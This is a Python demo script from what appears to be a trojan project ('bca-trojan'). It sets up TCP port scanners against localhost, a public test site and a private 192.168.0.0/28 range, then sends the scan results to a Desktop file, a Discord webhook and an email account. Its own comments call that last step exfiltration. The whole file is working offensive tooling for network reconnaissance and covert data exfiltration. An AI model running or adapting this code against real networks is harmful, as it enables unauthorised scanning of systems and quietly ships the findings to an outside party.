#!/usr/bin/env python3
# https://github.com/EONRaider/bca-trojan

__author__ = "EONRaider @ keybase.io/eonraider"

import os
import sys
from pathlib import Path

import dotenv


'''This is a simple demonstration of how the Scanner module could be 
set up on a Linux system to perform a Full-connect TCP scan on an 
arbitrary number of internal/external hosts and exfiltrate the results 
to a text file, a Discord server and an email address (as well as to 
the screen for debugging purposes).
The environment variable 'WEBHOOK_URL' must be passed if the Discord 
exfiltrator is to be used; similarly we need 'EMAIL_HOST', 'EMAIL_PORT', 
'EMAIL_USERNAME' and 'EMAIL_PASSWORD' for the Email exfiltrator.
'''

dotenv.load_dotenv()


def scanner_demo():
    # Set up a TCPScanner to send probes to internal and external targets
    scanner_simple = TCPScanner(targets=("localhost", "testphp.vulnweb.com"),
                                ports=(22, 80, 443),
                                timeout=10)

    # Set up another TCPScanner to probe a range of internal targets
    scanner_cidr = TCPScanner(targets="192.168.0.0/28",
                              ports=(22, 80, 443),
                              timeout=3)

    for scanner in scanner_simple, scanner_cidr:
        # Enable output of logs to STDOUT
        Screen(module=scanner)

        # A file will be written to the current user's Desktop
        File(module=scanner,
             file_path=Path.home().joinpath(
                 f"Desktop/sample_{scanner.__class__.__name__}_log.txt"))

        # Scan results will be sent to a Discord server through a Webhook
        Discord(module=scanner,
                webhook_url=os.getenv("WEBHOOK_URL"))

        # An email will be sent through a secure connection using SMTP
        Email(module=scanner,
              smtp_host=os.getenv("EMAIL_HOST"),
              smtp_port=int(os.getenv("EMAIL_PORT")),
              email=os.getenv("EMAIL_USERNAME"),
              password=os.getenv("EMAIL_PASSWORD"))

        # Done. Perform all scans and proceed to exfiltration of data.
        scanner.execute()


if __name__ == "__main__":
    sys.path.insert(0, str(Path(__file__).parents[1]))
    from src.modules.exfiltration import Discord, Email, File, Screen
    from src.modules.exploitation import TCPScanner

    scanner_demo()
